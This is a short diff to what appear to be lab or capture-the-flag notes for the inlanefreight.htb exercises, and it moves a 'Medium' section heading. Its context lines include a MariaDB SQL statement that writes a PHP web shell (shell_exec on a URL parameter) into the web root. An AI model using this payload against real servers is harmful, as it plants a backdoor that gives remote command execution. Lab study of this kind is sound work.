@@ -1,7 +1,5 @@
 ## Easy
 
-## Medium
-
 **Domain**
 ```
 inlanefreight.htb
@@ -150,7 +148,7 @@ MariaDB [(none)]>
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```
 
-
+## Medium
 
 **IP**
 ```
